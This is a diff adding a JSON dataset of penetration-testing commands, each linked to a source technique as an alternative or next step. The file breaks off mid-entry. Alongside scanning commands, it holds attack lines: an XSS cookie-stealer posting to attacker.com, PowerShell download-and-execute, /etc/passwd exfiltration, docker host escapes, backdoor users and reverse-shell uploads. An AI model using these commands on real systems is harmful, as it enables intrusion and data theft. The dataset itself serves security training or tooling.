@@ -1,0 +1,3015 @@
+{
+  "total_candidates": 497,
+  "by_tool": {
+    "fping": 1,
+    "arp-scan": 1,
+    "unknown": 425,
+    "masscan": 1,
+    "metasploit": 3,
+    "smbmap": 1,
+    "crackmapexec": 2,
+    "ffuf": 3,
+    "wfuzz": 2,
+    "sqlmap": 1,
+    "burpsuite": 2,
+    "wget": 5,
+    "curl": 10,
+    "searchsploit": 7,
+    "hydra": 1,
+    "python": 3,
+    "php": 2,
+    "ruby": 2,
+    "powershell": 9,
+    "base64": 2,
+    "socat": 3,
+    "perl": 1,
+    "certutil": 3,
+    "impacket-": 1,
+    "ssh": 1,
+    "msfvenom": 5
+  },
+  "candidates": [
+    {
+      "tool": "fping",
+      "source_command": "nmap-ping-sweep",
+      "relation_type": "alternatives",
+      "command_text": "fping -a -g <TARGET_SUBNET>"
+    },
+    {
+      "tool": "arp-scan",
+      "source_command": "nmap-ping-sweep",
+      "relation_type": "alternatives",
+      "command_text": "arp-scan -l"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "nmap-ping-sweep",
+      "relation_type": "next_steps",
+      "command_text": "Run full port scan on discovered hosts: nmap -p- <IP>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "nmap-ping-sweep",
+      "relation_type": "next_steps",
+      "command_text": "Perform service enumeration: nmap -sV -sC <IP>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "nmap-quick-scan",
+      "relation_type": "alternatives",
+      "command_text": "rustscan -a <TARGET>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "nmap-quick-scan",
+      "relation_type": "next_steps",
+      "command_text": "Service scan on open ports: nmap -sV -sC -p <PORTS> <TARGET>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "nmap-quick-scan",
+      "relation_type": "next_steps",
+      "command_text": "UDP scan if needed: nmap -sU --top-ports 20 <TARGET>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "nmap-quick-scan",
+      "relation_type": "next_steps",
+      "command_text": "Vulnerability scripts: nmap --script vuln -p <PORTS> <TARGET>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "nmap-service-scan",
+      "relation_type": "alternatives",
+      "command_text": "nmap -A <TARGET>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "nmap-service-scan",
+      "relation_type": "alternatives",
+      "command_text": "unicornscan -mS <TARGET>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "nmap-service-scan",
+      "relation_type": "next_steps",
+      "command_text": "Web enumeration if HTTP found: gobuster dir -u http://<IP>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "nmap-service-scan",
+      "relation_type": "next_steps",
+      "command_text": "SMB enumeration if 445 open: enum4linux -a <IP>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "nmap-service-scan",
+      "relation_type": "next_steps",
+      "command_text": "SSH brute if 22 open: hydra -L users -P pass ssh://<IP>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "nmap-vuln-scan",
+      "relation_type": "alternatives",
+      "command_text": "nmap --script smb-vuln* <TARGET>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "dns-enum",
+      "relation_type": "alternatives",
+      "command_text": "dnsenum <DOMAIN>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "dns-enum",
+      "relation_type": "alternatives",
+      "command_text": "fierce --domain <DOMAIN>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "dns-enum",
+      "relation_type": "alternatives",
+      "command_text": "host -t axfr <DOMAIN> <NS>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "dns-enum",
+      "relation_type": "next_steps",
+      "command_text": "Subdomain brute: gobuster dns -d <DOMAIN> -w wordlist"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "dns-enum",
+      "relation_type": "next_steps",
+      "command_text": "Reverse DNS on IP ranges: dnsrecon -r <RANGE>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "smb-enum",
+      "relation_type": "alternatives",
+      "command_text": "smbclient -L //<TARGET> -N"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "smb-enum",
+      "relation_type": "next_steps",
+      "command_text": "Mount shares: mount -t cifs //<IP>/<share> /mnt"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "smb-enum",
+      "relation_type": "next_steps",
+      "command_text": "Brute force: hydra -L users -P pass smb://<IP>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "snmp-enum",
+      "relation_type": "alternatives",
+      "command_text": "onesixtyone -c <WORDLIST> <TARGET>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "snmp-enum",
+      "relation_type": "alternatives",
+      "command_text": "snmp-check <TARGET>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "snmp-enum",
+      "relation_type": "alternatives",
+      "command_text": "snmpbulkwalk -c <SNMP_COMMUNITY> <TARGET>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "snmp-enum",
+      "relation_type": "next_steps",
+      "command_text": "Extract user accounts: snmpwalk -c <SNMP_COMMUNITY> -v2c <IP> 1.3.6.1.4.1.77.1.2.25"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "snmp-enum",
+      "relation_type": "next_steps",
+      "command_text": "Get running processes: snmpwalk -c <SNMP_COMMUNITY> -v2c <IP> 1.3.6.1.2.1.25.4.2.1.2"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "snmp-enum",
+      "relation_type": "next_steps",
+      "command_text": "Brute community strings: onesixtyone -c wordlist <IP>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "smb-smbclient-connect",
+      "relation_type": "next_steps",
+      "command_text": "Use 'ls' to list files"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "smb-smbclient-connect",
+      "relation_type": "next_steps",
+      "command_text": "Use 'get <FILE>' to download files"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "smb-smbclient-connect",
+      "relation_type": "next_steps",
+      "command_text": "Use 'put <FILE>' to upload files"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "smb-smbmap-recursive",
+      "relation_type": "next_steps",
+      "command_text": "Download interesting files: smbmap -H <TARGET> -u <USER> -p <PASS> --download '<SHARE>\\path\\file.txt'"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "smb-smbmap-recursive",
+      "relation_type": "next_steps",
+      "command_text": "Search for specific files: smbmap -H <TARGET> -u <USER> -p <PASS> -r <SHARE> -A password"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "smb-mount-share",
+      "relation_type": "prerequisites",
+      "command_text": "sudo mkdir -p <MOUNT_POINT>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "smb-mount-share",
+      "relation_type": "next_steps",
+      "command_text": "Browse share: ls -la <MOUNT_POINT>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "smb-mount-share",
+      "relation_type": "next_steps",
+      "command_text": "Search for files: find <MOUNT_POINT> -type f -name '*password*'"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "smb-mount-share",
+      "relation_type": "next_steps",
+      "command_text": "Copy files: cp <MOUNT_POINT>/path/file.txt ~/loot/"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "smb-mount-share",
+      "relation_type": "next_steps",
+      "command_text": "Unmount when done: sudo umount <MOUNT_POINT>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "vhost-fuzzing-gobuster",
+      "relation_type": "next_steps",
+      "command_text": "Add discovered vhosts to /etc/hosts: echo '<IP> vhost.example.com' | sudo tee -a /etc/hosts"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "vhost-fuzzing-gobuster",
+      "relation_type": "next_steps",
+      "command_text": "Browse discovered vhosts: http://vhost.example.com"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "vhost-fuzzing-gobuster",
+      "relation_type": "next_steps",
+      "command_text": "Run technology detection: whatweb http://vhost.example.com"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "vhost-fuzzing-gobuster",
+      "relation_type": "next_steps",
+      "command_text": "Directory enumeration on new vhosts: gobuster dir -u http://vhost.example.com -w <WORDLIST>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "dns-zone-transfer-dig",
+      "relation_type": "alternatives",
+      "command_text": "host -t axfr <DOMAIN> <NAMESERVER>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "dns-zone-transfer-dig",
+      "relation_type": "alternatives",
+      "command_text": "dnsrecon -d <DOMAIN> -t axfr"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "dns-zone-transfer-dig",
+      "relation_type": "next_steps",
+      "command_text": "Enumerate discovered hosts: sudo nmap -Pn -p- <DISCOVERED_IP>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "dns-zone-transfer-dig",
+      "relation_type": "next_steps",
+      "command_text": "Add subdomains to /etc/hosts for further testing"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "gobuster-dir",
+      "relation_type": "alternatives",
+      "command_text": "dirb <URL>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "gobuster-dir",
+      "relation_type": "next_steps",
+      "command_text": "Investigate found directories: curl <URL>/<FOUND_DIR>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "gobuster-dir",
+      "relation_type": "next_steps",
+      "command_text": "Scan subdirectories: gobuster dir -u <URL>/<DIR> -w <WORDLIST>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "nikto-scan",
+      "relation_type": "alternatives",
+      "command_text": "whatweb -v <URL>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "nikto-scan",
+      "relation_type": "alternatives",
+      "command_text": "wapiti -u <URL>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "nikto-scan",
+      "relation_type": "alternatives",
+      "command_text": "nuclei -u <URL>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "nikto-scan",
+      "relation_type": "next_steps",
+      "command_text": "Manually verify findings: curl -I <URL>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "sqlmap-basic",
+      "relation_type": "next_steps",
+      "command_text": "Enumerate databases: sqlmap -u '<URL>' --dbs"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "sqlmap-basic",
+      "relation_type": "next_steps",
+      "command_text": "Dump specific database: sqlmap -u '<URL>' -D <DATABASE> --dump"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "sqlmap-basic",
+      "relation_type": "next_steps",
+      "command_text": "Get shell: sqlmap -u '<URL>' --os-shell"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "sqli-manual-test",
+      "relation_type": "next_steps",
+      "command_text": "Use sqlmap for automation: sqlmap -u '<URL>?param=value'"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "wfuzz-params",
+      "relation_type": "next_steps",
+      "command_text": "Fuzz parameter values: wfuzz -z file,<WORDLIST> '<URL>?param=FUZZ'"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "xss-test",
+      "relation_type": "alternatives",
+      "command_text": "<img src=x onerror=alert(1)>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "xss-test",
+      "relation_type": "alternatives",
+      "command_text": "<svg onload=alert(1)>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "xss-test",
+      "relation_type": "alternatives",
+      "command_text": "\"><script>alert(1)</script>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "xss-test",
+      "relation_type": "alternatives",
+      "command_text": "<body onload=alert(1)>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "xss-test",
+      "relation_type": "next_steps",
+      "command_text": "Bypass filters: <ScRiPt>alert(1)</ScRiPt>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "xss-test",
+      "relation_type": "next_steps",
+      "command_text": "Steal cookies: <script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "lfi-test",
+      "relation_type": "alternatives",
+      "command_text": "....//....//etc/passwd"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "lfi-test",
+      "relation_type": "alternatives",
+      "command_text": "file:///etc/passwd"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "lfi-test",
+      "relation_type": "next_steps",
+      "command_text": "Read web config: ../../../../var/www/html/config.php"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "lfi-test",
+      "relation_type": "next_steps",
+      "command_text": "Get shell via log poisoning: ../../../var/log/apache2/access.log"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "lfi-test",
+      "relation_type": "next_steps",
+      "command_text": "PHP filter wrapper: php://filter/convert.base64-encode/resource=index.php"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "curl-post",
+      "relation_type": "alternatives",
+      "command_text": "httpie POST <URL> param=value"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "curl-post",
+      "relation_type": "next_steps",
+      "command_text": "Add headers: curl -X POST -H 'Content-Type: application/json' -d '{\"key\":\"value\"}' <URL>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "curl-post",
+      "relation_type": "next_steps",
+      "command_text": "Save cookies: curl -c cookies.txt -X POST -d 'user=admin' <URL>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "curl-post",
+      "relation_type": "next_steps",
+      "command_text": "Use cookies: curl -b cookies.txt <URL>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "curl-post",
+      "relation_type": "next_steps",
+      "command_text": "Follow redirects: curl -L -X POST -d 'data' <URL>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "whatweb-enum",
+      "relation_type": "next_steps",
+      "command_text": "Search for version exploits: searchsploit <technology> <version>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "wpscan-password-attack",
+      "relation_type": "next_steps",
+      "command_text": "Login to WordPress: navigate to <URL>/wp-admin/ with found credentials"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "wpscan-password-attack",
+      "relation_type": "next_steps",
+      "command_text": "Upload plugin shell if admin: Plugins > Add New > Upload Plugin > choose PHP reverse shell as .zip"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "wpscan-password-attack",
+      "relation_type": "next_steps",
+      "command_text": "Edit theme files: Appearance > Theme Editor > 404.php (add PHP reverse shell)"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "wordpress-xmlrpc-enum",
+      "relation_type": "alternatives",
+      "command_text": "wpscan --url <URL> --enumerate u --passwords <WORDLIST> (uses xmlrpc if available)"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "wordpress-xmlrpc-enum",
+      "relation_type": "next_steps",
+      "command_text": "Brute force credentials: curl -X POST -d '<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>password123</value></param></params></methodCall>' <URL>/xmlrpc.php"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "wordpress-xmlrpc-enum",
+      "relation_type": "next_steps",
+      "command_text": "Use system.multicall for faster brute force (multiple attempts in one request)"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "wordpress-manual-version",
+      "relation_type": "next_steps",
+      "command_text": "Search for exploits: searchsploit wordpress <version>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "check-docker-group",
+      "relation_type": "alternatives",
+      "command_text": "cat /etc/group | grep docker"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "check-docker-socket",
+      "relation_type": "alternatives",
+      "command_text": "stat /var/run/docker.sock"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "docker-mount-escape",
+      "relation_type": "alternatives",
+      "command_text": "docker run -v /:/host --rm -it <IMAGE_NAME> sh (then manually: chroot /host)"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "docker-mount-escape",
+      "relation_type": "alternatives",
+      "command_text": "docker run --privileged -it <IMAGE_NAME> sh"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "docker-mount-escape",
+      "relation_type": "alternatives",
+      "command_text": "docker run --pid=host -it <IMAGE_NAME> nsenter -t 1 -m -u -n -i sh"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "verify-docker-root",
+      "relation_type": "alternatives",
+      "command_text": "cat /mnt/etc/passwd"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "verify-docker-root",
+      "relation_type": "next_steps",
+      "command_text": "Extract credentials from /mnt/etc/shadow"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "verify-docker-root",
+      "relation_type": "next_steps",
+      "command_text": "Modify /mnt/etc/passwd to add backdoor user"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "verify-docker-root",
+      "relation_type": "next_steps",
+      "command_text": "Add SSH public key to /mnt/root/.ssh/authorized_keys"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "docker-privileged-escape",
+      "relation_type": "alternatives",
+      "command_text": "docker run --pid=host -it <IMAGE_NAME> nsenter -t 1 -m -u -n -i sh"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "docker-privileged-escape",
+      "relation_type": "next_steps",
+      "command_text": "Mount host: mkdir /mnt/host && mount /dev/sda1 /mnt/host"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "docker-socket-mount",
+      "relation_type": "alternatives",
+      "command_text": "Use image with docker client: docker pull docker:latest"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "docker-socket-mount",
+      "relation_type": "next_steps",
+      "command_text": "Inside container: docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "docker-pull-alpine",
+      "relation_type": "alternatives",
+      "command_text": "Use existing images from docker images"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "python-http-server",
+      "relation_type": "next_steps",
+      "command_text": "Download from target: wget http://<LHOST>:<PORT>/file"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "python-http-server",
+      "relation_type": "next_steps",
+      "command_text": "Windows download: certutil -urlcache -f http://<LHOST>:<PORT>/file file"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "python-http-server",
+      "relation_type": "next_steps",
+      "command_text": "PowerShell: Invoke-WebRequest http://<LHOST>:<PORT>/file -OutFile file"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "python-http-server",
+      "relation_type": "next_steps",
+      "command_text": "Curl: curl http://<LHOST>:<PORT>/file -o file"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "wget-download",
+      "relation_type": "alternatives",
+      "command_text": "fetch http://<LHOST>:<PORT>/<FILE>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "wget-download",
+      "relation_type": "next_steps",
+      "command_text": "Make executable: chmod +x <FILE>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "wget-download",
+      "relation_type": "next_steps",
+      "command_text": "Execute: ./<FILE>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "wget-download",
+      "relation_type": "next_steps",
+      "command_text": "Background download: wget -b <URL>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "curl-upload",
+      "relation_type": "next_steps",
+      "command_text": "Setup receiver: python3 -m uploadserver"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "curl-upload",
+      "relation_type": "next_steps",
+      "command_text": "Alternative: nc -l -p <PORT> > file"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "curl-upload",
+      "relation_type": "next_steps",
+      "command_text": "PHP receiver: file_put_contents('upload.txt', file_get_contents('php://input'))"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "certutil-download",
+      "relation_type": "alternatives",
+      "command_text": "bitsadmin /transfer job http://<LHOST>/<FILE> C:\\temp\\<FILE>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "certutil-download",
+      "relation_type": "next_steps",
+      "command_text": "Execute: .\\<OUTPUT>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "certutil-download",
+      "relation_type": "next_steps",
+      "command_text": "Alternative encoding: certutil -encode file.exe file.txt"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "certutil-download",
+      "relation_type": "next_steps",
+      "command_text": "Decode: certutil -decode file.txt file.exe"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "powershell-download",
+      "relation_type": "next_steps",
+      "command_text": "Execute in memory: IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>')"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "powershell-download",
+      "relation_type": "next_steps",
+      "command_text": "Download and execute: powershell -exec bypass -c \"IEX(IWR http://<LHOST>/<FILE> -UseBasicParsing)\""
+    },
+    {
+      "tool": "unknown",
+      "source_command": "powershell-download",
+      "relation_type": "next_steps",
+      "command_text": "Alternative: (New-Object System.Net.WebClient).DownloadFile('http://<LHOST>/<FILE>','<OUTPUT>')"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "smb-server",
+      "relation_type": "next_steps",
+      "command_text": "Windows access: net use \\\\<LHOST>\\share"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "smb-server",
+      "relation_type": "next_steps",
+      "command_text": "Copy file: copy \\\\<LHOST>\\share\\file.exe C:\\temp\\"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "smb-server",
+      "relation_type": "next_steps",
+      "command_text": "Execute directly: \\\\<LHOST>\\share\\file.exe"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "smb-server",
+      "relation_type": "next_steps",
+      "command_text": "List files: dir \\\\<LHOST>\\share"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "nc-file-transfer",
+      "relation_type": "alternatives",
+      "command_text": "ncat -l <LPORT> > <FILE>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "nc-file-transfer",
+      "relation_type": "next_steps",
+      "command_text": "Send from target: nc <LHOST> <LPORT> < file"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "nc-file-transfer",
+      "relation_type": "next_steps",
+      "command_text": "Send from Windows: type file | nc <LHOST> <LPORT>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "nc-file-transfer",
+      "relation_type": "next_steps",
+      "command_text": "Compressed transfer: tar czf - /path | nc <LHOST> <LPORT>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "rdesktop-disk-share",
+      "relation_type": "prerequisites",
+      "command_text": "mkdir -p <LOCAL_PATH>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "rdesktop-disk-share",
+      "relation_type": "prerequisites",
+      "command_text": "sudo nmap -p <PORT> -Pn -v <TARGET> to verify RDP accessible"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "rdesktop-disk-share",
+      "relation_type": "next_steps",
+      "command_text": "Example: copy C:\\Users\\offsec\\Desktop\\malware.exe \\\\tsclient\\share\\"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "base64-transfer",
+      "relation_type": "alternatives",
+      "command_text": "xxd -p <FILE>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "base64-transfer",
+      "relation_type": "alternatives",
+      "command_text": "od -An -tx1 <FILE>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "base64-transfer",
+      "relation_type": "alternatives",
+      "command_text": "hexdump -ve '1/1 \"%.2x\"' <FILE>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "base64-transfer",
+      "relation_type": "next_steps",
+      "command_text": "Receive and decode: nc -l <LPORT> | base64 -d > file"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "base64-transfer",
+      "relation_type": "next_steps",
+      "command_text": "Copy paste method: base64 <FILE> then copy output"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "base64-transfer",
+      "relation_type": "next_steps",
+      "command_text": "Windows decode: certutil -decode input.txt output.exe"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "ftp-transfer",
+      "relation_type": "next_steps",
+      "command_text": "Windows FTP: ftp <LHOST>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "ftp-transfer",
+      "relation_type": "next_steps",
+      "command_text": "Download: ftp> get file.exe"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "ftp-transfer",
+      "relation_type": "next_steps",
+      "command_text": "Upload: ftp> put file.txt"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "ftp-transfer",
+      "relation_type": "next_steps",
+      "command_text": "Script FTP: echo 'get file' | ftp -n <LHOST>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "scp-transfer",
+      "relation_type": "alternatives",
+      "command_text": "rsync -avz file <USERNAME>@<TARGET>:/tmp/"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "scp-transfer",
+      "relation_type": "alternatives",
+      "command_text": "sftp <USERNAME>@<TARGET>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "scp-transfer",
+      "relation_type": "next_steps",
+      "command_text": "Download from target: scp <USERNAME>@<TARGET>:/path/file ."
+    },
+    {
+      "tool": "unknown",
+      "source_command": "scp-transfer",
+      "relation_type": "next_steps",
+      "command_text": "Use SSH key: scp -i id_rsa file <USERNAME>@<TARGET>:/tmp/"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "scp-transfer",
+      "relation_type": "next_steps",
+      "command_text": "Custom port: scp -P 2222 file <USERNAME>@<TARGET>:/tmp/"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "scp-transfer",
+      "relation_type": "next_steps",
+      "command_text": "Recursive copy: scp -r folder/ <USERNAME>@<TARGET>:/tmp/"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "php-download",
+      "relation_type": "next_steps",
+      "command_text": "One-liner: php -r \"file_put_contents('f',file_get_contents('http://<LHOST>/f'));\""
+    },
+    {
+      "tool": "unknown",
+      "source_command": "php-download",
+      "relation_type": "next_steps",
+      "command_text": "Execute: php -r \"system(file_get_contents('http://<LHOST>/cmd.txt'));\""
+    },
+    {
+      "tool": "unknown",
+      "source_command": "php-download",
+      "relation_type": "next_steps",
+      "command_text": "Upload: php -r \"file_put_contents('ftp://<LHOST>/file',file_get_contents('/etc/passwd'));\""
+    },
+    {
+      "tool": "unknown",
+      "source_command": "php-download",
+      "relation_type": "next_steps",
+      "command_text": "Base64: php -r \"file_put_contents('f',base64_decode(file_get_contents('http://<LHOST>/f.b64')));\""
+    },
+    {
+      "tool": "unknown",
+      "source_command": "perl-download",
+      "relation_type": "next_steps",
+      "command_text": "Make executable: chmod +x <OUTPUT>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "perl-download",
+      "relation_type": "next_steps",
+      "command_text": "Execute downloaded: perl <OUTPUT>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "perl-download",
+      "relation_type": "next_steps",
+      "command_text": "One-liner exec: perl -e 'system(qx{curl http://<LHOST>/cmd})'"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "vbscript-download",
+      "relation_type": "next_steps",
+      "command_text": "Execute downloaded: .\\<OUTPUT>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "debug-exe-transfer",
+      "relation_type": "next_steps",
+      "command_text": "Transfer script content via copy/paste"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "debug-exe-transfer",
+      "relation_type": "next_steps",
+      "command_text": "Execute on target: debug < script.txt"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "debug-exe-transfer",
+      "relation_type": "next_steps",
+      "command_text": "Verify: fc /b original.exe created.exe"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "dns-exfiltration",
+      "relation_type": "next_steps",
+      "command_text": "Extract from logs: grep -oP '(?<=query\\[A\\] )[^.]+' dns.log"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "file-transfer-python-http",
+      "relation_type": "next_steps",
+      "command_text": "On Linux target: wget http://<LHOST>:<PORT>/file"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "file-transfer-python-http",
+      "relation_type": "next_steps",
+      "command_text": "On Windows target: certutil -urlcache -f http://<LHOST>:<PORT>/file file"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "file-transfer-wget",
+      "relation_type": "alternatives",
+      "command_text": "Use /dev/tcp for raw download"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "file-transfer-curl",
+      "relation_type": "alternatives",
+      "command_text": "Use -k for self-signed certificates"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "file-transfer-powershell-download",
+      "relation_type": "alternatives",
+      "command_text": "Invoke-WebRequest -Uri <URL> -OutFile <FILE>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "file-transfer-scp",
+      "relation_type": "alternatives",
+      "command_text": "Use with -i for SSH key: scp -i key.pem file target:/path"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "file-transfer-smb",
+      "relation_type": "alternatives",
+      "command_text": "net use Z: \\\\\\\\<LHOST>\\\\<SHARE>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "file-transfer-smb",
+      "relation_type": "alternatives",
+      "command_text": "Run directly: \\\\\\\\<LHOST>\\\\share\\\\file.exe"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "file-transfer-nc-push",
+      "relation_type": "alternatives",
+      "command_text": "/dev/tcp for bash-based transfer"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "file-transfer-nc-push",
+      "relation_type": "next_steps",
+      "command_text": "On target run: nc <LHOST> <PORT> > <FILE>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "file-transfer-nc-pull",
+      "relation_type": "alternatives",
+      "command_text": "Use base64 encoding for text-safe transfer"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "file-transfer-nc-pull",
+      "relation_type": "next_steps",
+      "command_text": "On target: nc <LHOST> <PORT> < <FILE>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "file-transfer-base64",
+      "relation_type": "next_steps",
+      "command_text": "On target (Linux): nc -lvnp <PORT> | base64 -d > file"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "file-transfer-base64",
+      "relation_type": "next_steps",
+      "command_text": "On target (Windows): certutil -decode input.b64 output.exe"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "file-transfer-php",
+      "relation_type": "alternatives",
+      "command_text": "Use existing file upload functionality"
+    },
+    {
+      "tool": "unknown",
